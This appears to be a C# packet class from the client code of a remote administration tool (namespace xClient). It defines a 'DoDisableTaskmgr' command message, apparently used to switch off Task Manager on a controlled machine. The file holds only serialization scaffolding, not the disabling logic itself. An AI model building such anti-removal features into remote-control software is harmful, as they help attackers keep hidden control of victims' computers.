using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDisableTaskmgr : IPacket
{
	public string Text { get; set; }

	public DoDisableTaskmgr()
	{
	}

	public DoDisableTaskmgr(string text)
	{
		Text = text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
